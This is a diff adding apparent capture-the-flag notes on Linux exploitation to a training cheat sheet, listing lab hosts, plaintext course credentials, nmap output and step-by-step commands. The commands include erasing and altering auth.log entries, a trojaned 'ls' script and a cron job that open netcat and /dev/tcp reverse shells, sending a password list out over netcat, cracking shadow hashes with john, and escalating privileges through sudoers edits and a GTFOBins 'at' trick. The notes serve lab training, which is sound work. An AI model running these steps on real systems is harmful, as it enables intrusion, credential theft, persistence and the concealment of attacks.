@@ -3993,6 +3993,104 @@ Log Cleaning
 
 ```
 
+## Linux Exploitation Flag Notes
+```
+Scheme of Maneuver:
+>Jump Box
+->Pivot:192.168.28.105
+--->T1: 192.168.28.27
+--->T2: 192.168.28.12
+
+Target Section:
+
+Pivot
+Hostname: Donovian-Terminal
+IP: 192.168.28.105
+OS: Ubuntu 18.04
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+PSP: rkhunter
+Malware: none
+Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.
+
+T1
+Hostname: unknown
+IP: 192.168.28.27
+OS: Linux ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: unknown
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+Nmap scan report for 192.168.28.27
+Host is up (0.00080s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+
+T2
+Hostname: unknown
+IP: 192.168.28.12
+OS: Linux ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: unknown
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+Nmap scan report for 192.168.28.12
+Host is up (0.00076s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+billybob
+bobby
+comrade
+jerry
+jimmy
+sarah
+ubuntu
+wendy
+
+
+## Useful Steps
+
+	Log Cleaning
+	egrep -v '21:51:32|10:02:15' auth.log > auth.log2
+	sed -i 's/172.16.34.4/192.168.1.103/g' auth.log2
+	md5sum auth.log2
+	vim /var/tmp/ls and in /tmp/ls
+	#!/bin/bash
+	nc 10.50.38.176 6789 -e /bin/bash
+	chmod +x both scripts
+	open a nc on lin-ops
+	nc -lvp 6789 # wait for connection to be established
+	vim /var/tmp/ls
+	vim /tmp/ls
+	nc 10.50.38.176 6789 < /home/billybob/10-million-password-list-top-10000.txt # this will send this file over to your nc connection
+	proxychains nc -lvp 6789 > words.txt # this will copy the contents of target box wordlist to a file on your linops
+	/usr/sbin/john --wordlist=words.txt shadow.txt 
+	/usr/sbin/john --show shadow.txt
+	ssh -X zeus@127.0.0.1 -p 10229 # ensure you spell zeus right
+	crontab -e
+	* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.28.135/33403 0>&1' # follow question instructions and flag will be present in tmp directory
+	ls  /tmp
+	find / -type f -perm /6000 -ls 2>/dev/null
+	/var/tmp/testbed/unknown
+	file unknown to see what it is
+	see what the executable is doing by trying to pass arguments to it
+	./unknown /etc/sudoers "comrade ALL=(ALL:ALL) ALL"
+	add comrade with full permissions to the /etc/sudoers file
+	echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
+	gtfobins to use at found with the find command to get shell access
+```
+
+
+
+
 
 
 
